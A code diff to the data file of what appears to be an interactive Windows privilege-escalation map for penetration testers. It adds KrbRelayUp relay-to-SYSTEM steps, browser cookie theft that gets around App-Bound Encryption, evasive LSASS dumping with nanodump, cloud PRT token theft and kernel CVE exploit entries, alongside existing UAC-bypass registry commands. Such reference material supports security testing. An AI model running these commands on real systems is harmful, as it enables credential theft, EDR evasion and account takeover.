@@ -30,6 +30,7 @@ window.PRIVMAP_DATA = {
           outcomes: [{ label: "Enumeration done", color: "#94a3b8" }],
           moveTo: [
             { section: "token-privs", note: "a dangerous privilege is Enabled / enable-able" },
+            { section: "domain-local", note: "domain-joined workstation (default LDAP config)" },
             { section: "uac", note: "you are a local admin stuck at Medium integrity" },
             { section: "evasion", note: "get quiet before you run tradecraft" }
           ] },
@@ -62,10 +63,12 @@ window.PRIVMAP_DATA = {
             { label: "4. Installer & app policy", note: "AlwaysInstallElevated (both keys = 1), a writable %PATH% entry before a privileged binary, a writable installed-app directory.", cmds: ["reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"], outcomes: [{ label: "Installer / app", color: "#f59e0b" }] },
             { label: "5. Stored credentials", note: "unattend.xml, GPP cpassword, Winlogon autologon, cmdkey / Credential Manager, DPAPI, PowerShell history, config files, saved Wi-Fi.", cmds: ["cmdkey /list", "findstr /spin \"password\" C:\\*.xml C:\\*.ini C:\\*.config 2>nul"], outcomes: [{ label: "Credentials", color: "#a78bfa" }] },
             { label: "6. UAC (if local admin at Medium)", note: "auto-elevating binaries / registry hijacks / GUI (msconfig, MMC, azman) reach High with no prompt.", cmds: ["whoami /groups | findstr /i \"Label\""], outcomes: [{ label: "UAC bypass", color: "#3b9ee5" }] },
-            { label: "7. Kernel / CVE", note: "match the build + missing hotfixes to a known local-SYSTEM exploit (and look for a loadable vulnerable driver / BYOVD).", cmds: ["systeminfo", "wmic qfe get HotFixID,InstalledOn"], outcomes: [{ label: "Kernel / CVE", color: "#3b9ee5" }] }
+            { label: "7. Kernel / CVE", note: "match the build + missing hotfixes to a known local-SYSTEM exploit (and look for a loadable vulnerable driver / BYOVD).", cmds: ["systeminfo", "wmic qfe get HotFixID,InstalledOn"], outcomes: [{ label: "Kernel / CVE", color: "#3b9ee5" }] },
+            { label: "8. Domain-joined workstation", note: "a plain domain user can reach SYSTEM via Kerberos relay-to-self (KrbRelayUp) while LDAP signing is unenforced — no local admin needed.", cmds: ["systeminfo | findstr /i Domain"], outcomes: [{ label: "Kerberos relay", color: "#3b9ee5" }] }
           ],
           moveTo: [
             { section: "token-privs", note: "finding 1" },
+            { section: "domain-local", note: "finding 8 — domain-joined" },
             { section: "services", note: "finding 2" },
             { section: "scheduled", note: "finding 3" },
             { section: "installer-apps", note: "finding 4" },
@@ -200,6 +203,30 @@ window.PRIVMAP_DATA = {
       ]
     },
     {
+      id: "domain-local", title: "Domain-Joined → SYSTEM (Kerberos relay)", color: "#3b9ee5", tag: "domain-joined",
+      desc: "On a domain-joined workstation a plain domain user — no local admin, no special privilege — can often reach SYSTEM by abusing Kerberos relay against the machine's own account. These are default-configuration attacks, not CVEs: they keep working until the domain enforces LDAP signing / channel binding.",
+      techniques: [
+        { id: "krbrelayup", title: "KrbRelayUp — no-fix local SYSTEM",
+          theory: { label: "Resource-Based Constrained Delegation", url: "theory/2026-08-18-delegation.html" },
+          vuln: { label: "AD Attack Map", url: "ad-map.html" },
+          desc: "Trigger local Kerberos auth, relay it to LDAP on a DC, and give yourself control of the computer object, then S4U to mint a SYSTEM service ticket for the local host. Works in default AD where LDAP signing is not enforced and MachineAccountQuota > 0.",
+          cmds: ["systeminfo | findstr /i \"Domain\"   # domain-joined, and not a DC?", "KrbRelayUp.exe full -m rbcd -d <domain> -cn <host>          # -> SYSTEM shell", "KrbRelayUp.exe full -m shadowcred -d <domain> -cn <host>    # if MachineAccountQuota = 0"],
+          branches: [
+            { label: "RBCD method (MachineAccountQuota > 0)", note: "Add an attacker-controlled computer account and set resource-based constrained delegation on the victim's machine object, then S4U2self/S4U2proxy to impersonate a local admin to the host.", cmds: ["KrbRelayUp.exe full -m rbcd -cn <host>"], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
+            { label: "Shadow-Credentials method (MAQ = 0)", note: "When you cannot add a computer account, write msDS-KeyCredentialLink on the victim object (Shadow Credentials / Whisker) and PKINIT for its TGT instead — same S4U finish.", cmds: ["KrbRelayUp.exe full -m shadowcred -cn <host>"], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] }
+          ],
+          outcomes: [{ label: "SYSTEM", color: "#4ade80" }, { label: "blocked: LDAP signing on", color: "#64748b" }],
+          moveTo: [{ section: "system", note: "KrbRelayUp returns a SYSTEM shell" }] },
+        { id: "coerce-relay", title: "Coerce & relay (the broader class)",
+          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
+          vuln: { label: "AD Attack Map", url: "ad-map.html" },
+          desc: "KrbRelayUp is one instance of coerce-and-relay. The same primitive — coerce a machine to authenticate, relay it to LDAP / ADCS / SMB — underpins ADCS ESC8, RBCD takeovers and relay-to-DC. The AD map owns the full tradecraft; on a single host, relay-to-self is the local-SYSTEM angle.",
+          cmds: ["# coerce (PetitPotam / PrinterBug / DFSCoerce) -> relay (ntlmrelayx / KrbRelay)", "# see the AD map's relay stage for target selection"],
+          outcomes: [{ label: "SYSTEM / domain", color: "#4ade80" }],
+          moveTo: [{ section: "system", note: "local SYSTEM via relay-to-self" }] }
+      ]
+    },
+    {
       id: "services", title: "Service Misconfigurations", color: "#3b9ee5", tag: "services",
       desc: "Services usually run as SYSTEM, so any input a low-priv user controls — the binary, its folder, the config, the registry key, a DLL it loads — is a path to SYSTEM.",
       techniques: [
@@ -295,7 +322,7 @@ window.PRIVMAP_DATA = {
         { id: "uac-registry", title: "Auto-elevate + registry/COM hijack",
           theory: { label: "Windows Access Tokens & UAC", url: "theory/2026-08-18-windows-tokens-uac.html" },
           vuln: { label: "UAC Bypass", url: "vuln-detail.html?vuln=uac-bypass" },
-          desc: "Signed auto-elevating binaries read an attacker-writable HKCU handler, or an elevated COM object is created fileless. fodhelper / computerdefaults / eventvwr / sdclt / the CMSTPLUA COM moniker are the staples — UACME automates 70+.",
+          desc: "Signed auto-elevating binaries read an attacker-writable HKCU handler, or an elevated COM object is created fileless. fodhelper / computerdefaults / sdclt and the CMSTPLUA COM moniker are the current staples (the classic eventvwr hijack is long patched) — UACME automates 70+.",
           cmds: ["whoami /groups | findstr /i \"Label\"   # confirm Medium", "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f", "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f", "fodhelper.exe"],
           outcomes: [{ label: "high integrity", color: "#4ade80" }],
           moveTo: [{ section: "token-privs", note: "High integrity -> your token's privileges unlock" }, { section: "system", note: "elevated routes open up" }] },
@@ -351,12 +378,16 @@ window.PRIVMAP_DATA = {
           cmds: ["vaultcmd /listcreds:\"Windows Credentials\" /all", "# SharpDPAPI / mimikatz dpapi:: to decrypt masterkeys + blobs"],
           outcomes: [{ label: "credentials", color: "#f59e0b" }],
           moveTo: [{ section: "system", note: "reuse decrypted credentials" }] },
-        { id: "browser", title: "Browser credentials & tokens",
+        { id: "browser", title: "Browser passwords, cookies & sessions",
           theory: { label: "Browser Credential & Token Theft", url: "theory/2026-10-15-browser-credential-theft.html" },
-          desc: "Saved logins, cookies and session tokens in Chrome/Edge/Firefox profiles — often reused for admin portals and cloud.",
-          cmds: ["# decrypt with the user's DPAPI key (and App-Bound Encryption key on recent Chrome)"],
+          desc: "Chrome/Edge/Firefox profiles hold saved logins, cookies and live session tokens. In the MFA era a stolen session cookie — imported into your browser to ride the already-authenticated session — is often worth more than a password. Recent Chromium wraps cookies in App-Bound Encryption, so the old DPAPI-only decrypt no longer covers them.",
+          cmds: ["# Chromium: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\{Login Data, Network\\Cookies}", "# Firefox: key4.db + logins.json -> firefox_decrypt"],
+          branches: [
+            { label: "Passwords — DPAPI (still works)", note: "Login Data stays AES-GCM under a DPAPI-wrapped key; App-Bound Encryption only changed cookie storage. Decrypt with SharpChrome or the user's masterkey.", cmds: ["SharpChrome logins /unprotect"], outcomes: [{ label: "saved passwords", color: "#f59e0b" }] },
+            { label: "Cookies — defeat App-Bound Encryption", note: "Chrome 127+ (Jul 2024) encrypts cookies via a SYSTEM elevation (COM) service that path-checks the caller. Bypass by calling it from Chrome's own directory or injecting a Chrome process, or the no-admin COM-hijack (CyberArk 'C4 Bomb'). Public tooling: Chrome-App-Bound-Encryption-Decryption (adopted by Lumma/Stealc/Vidar).", cmds: ["# elevation-service abuse -> plaintext cookies", "# import cookies into your browser -> ride the live session (MFA already satisfied)"], outcomes: [{ label: "session cookies", color: "#4ade80" }] }
+          ],
           outcomes: [{ label: "credentials / sessions", color: "#f59e0b" }],
-          moveTo: [{ section: "system", note: "reuse creds / hijack sessions" }] },
+          moveTo: [{ section: "system", note: "reuse creds / ride live sessions" }] },
         { id: "sam-lsa", title: "SAM + SYSTEM / LSA secrets (admin)",
           theory: { label: "Windows Credential Storage", url: "theory/2026-08-18-windows-credential-storage.html" },
           vuln: { label: "SAM & LSA Secrets", url: "vuln-detail.html?vuln=sam-lsa-secrets" },
@@ -367,10 +398,21 @@ window.PRIVMAP_DATA = {
         { id: "lsass", title: "Dump LSASS (admin / SeDebug)",
           theory: { label: "LSASS Dumping & Credential Extraction", url: "theory/2026-10-09-lsass-credential-extraction.html" },
           vuln: { label: "LSASS Dumping", url: "vuln-detail.html?vuln=lsass-dumping" },
-          desc: "LSASS holds NT hashes, Kerberos keys/tickets and sometimes cleartext for everyone logged on — the richest single source once you hold admin/SeDebug.",
-          cmds: ["rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\l.dmp full", "# parse offline: mimikatz sekurlsa::minidump + sekurlsa::logonpasswords / ekeys"],
+          desc: "LSASS can hold NT hashes, Kerberos keys/tickets and (WDigest/legacy only) cleartext. Two modern realities decide what you actually get: the classic comsvcs MiniDump is signatured and caught by every EDR, and Credential Guard (default-on since Win11 22H2 / Server 2022 Enterprise) seals those secrets in VBS. Pick the method and your expectations from the branches.",
+          cmds: ["tasklist /fi \"imagename eq lsass.exe\"   # find the pid", "# choose an evasive dump below, then parse the .dmp offline on Kali"],
+          branches: [
+            { label: "Evasive dump (comsvcs is caught)", note: "EDR flags rundll32 comsvcs MiniDump and a direct OpenProcess on lsass. Prefer a handle-duplication / direct-syscall dumper (nanodump), a PssCaptureSnapshot clone, or a signed-LOLBin dump, then exfil and parse offline.", cmds: ["nanodump.x64.exe --fork -w C:\\temp\\l.dmp", "pypykatz lsa minidump C:\\temp\\l.dmp   # parse off-host"], outcomes: [{ label: "dump captured", color: "#f59e0b" }] },
+            { label: "Credential Guard on — the dump yields little", note: "Default-on Win11 22H2+/Server 2022 Enterprise keeps LSA secrets in LSAIso (VBS): no NTLM/TGT keys, no cleartext. Pivot to what CG does NOT cover — DPAPI, tickets you can still request as the user, and the cloud PRT.", cmds: ["Get-ComputerInfo | Select *DeviceGuard*   # VBS / CG state", "# then: DPAPI blobs, Rubeus tickets, sekurlsa::cloudap (PRT)"], outcomes: [{ label: "go DPAPI / tickets / PRT", color: "#a78bfa" }] },
+            { label: "Classic parse (CG off / legacy)", note: "Where Credential Guard is absent (Pro edition, older builds, Server pre-2022) the dump still yields hashes, Kerberos keys and sometimes cleartext.", cmds: ["# mimikatz: sekurlsa::minidump l.dmp -> sekurlsa::logonpasswords / ekeys"], outcomes: [{ label: "hashes / tickets / cleartext", color: "#f59e0b" }] }
+          ],
           outcomes: [{ label: "domain creds / tickets", color: "#f59e0b" }],
-          moveTo: [{ section: "system", note: "reuse creds / tickets to pivot" }] }
+          moveTo: [{ section: "system", note: "reuse creds / tickets to pivot" }] },
+        { id: "prt-cloud", title: "Cloud PRT & session-token theft (Entra-joined)",
+          theory: { label: "AiTM, Token & Session Theft", url: "theory/2026-10-15-aitm-token-and-session-theft.html" },
+          desc: "On an Entra-joined / hybrid host the Primary Refresh Token is the keys to the tenant — replay it for SSO as the user with MFA already satisfied, no password needed. On a modern corporate laptop this usually beats any on-host hash, and Credential Guard does not protect it.",
+          cmds: ["dsregcmd /status   # AzureAdJoined / DomainJoined? AzureAdPrt : YES?", "# as SYSTEM: mimikatz sekurlsa::cloudap   — or ROADtoken / roadtx for a usable PRT cookie", "# AADInternals: Get-AADIntUserPRTToken"],
+          outcomes: [{ label: "cloud SSO as user", color: "#4ade80" }, { label: "MFA bypassed", color: "#f59e0b" }],
+          moveTo: [{ section: "system", note: "pivot into the tenant with the PRT" }] }
       ]
     },
     {
@@ -385,7 +427,8 @@ window.PRIVMAP_DATA = {
           branches: [
             { label: "PrintNightmare — Print Spooler driver install", cve: "CVE-2021-34527", note: "Authenticated user installs a malicious printer driver and runs code as SYSTEM (also the RCE CVE-2021-1675). Needs the Spooler running.", cmds: ["Invoke-Nightmare   # or the SharpPrintNightmare / CVE-2021-1675 PoC"], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
             { label: "HiveNightmare / SeriousSAM — world-readable hives", cve: "CVE-2021-36934", note: "Overly permissive ACLs on the SAM/SYSTEM/SECURITY hives let a non-admin read them from a VSS shadow copy and extract the local admin hash. Win10/11 1809+.", cmds: ["# read \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\System32\\config\\SAM", "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"], outcomes: [{ label: "admin hash", color: "#f59e0b" }] },
-            { label: "CLFS driver EoP (exploited in the wild)", cve: "CVE-2023-28252", note: "Common Log File System kernel driver flaw used by ransomware for SYSTEM; one of several CLFS EoPs — match the patch level.", outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
+            { label: "CLFS driver EoP (exploited in the wild)", cve: "CVE-2025-29824", note: "A clfs.sys use-after-free giving standard-user -> SYSTEM, run in the wild by Storm-2460 (PipeMagic) to stage ransomware; patched Apr 2025, Win11 24H2 hardened against it. CLFS is a recurring EoP class (also CVE-2023-28252, CVE-2024-49138) — match the patch level.", outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
+            { label: "afd.sys WinSock EoP — reliable public PoC", cve: "CVE-2023-21768", note: "An arbitrary kernel write in the Ancillary Function Driver (AfdNotifyRemoveIoCompletion), weaponised to SYSTEM via I/O-ring primitives. Very reliable public PoC + Metasploit module on Win11 22H2 / Server 2022 up to the Jan-2023 patch.", cmds: ["# msf exploit/windows/local/cve_2023_21768_afd_lpe"], outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
             { label: "Win32k EoP", cve: "CVE-2022-21882", note: "Win32k use-after-free (bypass of the CVE-2021-1732 fix) for kernel-level SYSTEM on unpatched Win10/Server builds.", outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
             { label: "Windows Installer repair/rollback EoP", cve: "CVE-2025-27727", note: "A recent Windows Installer cleanup/arbitrary-path flaw abused for SYSTEM — representative of the recurring msiexec rollback LPE class; verify the patch level.", outcomes: [{ label: "SYSTEM", color: "#4ade80" }] }
           ],
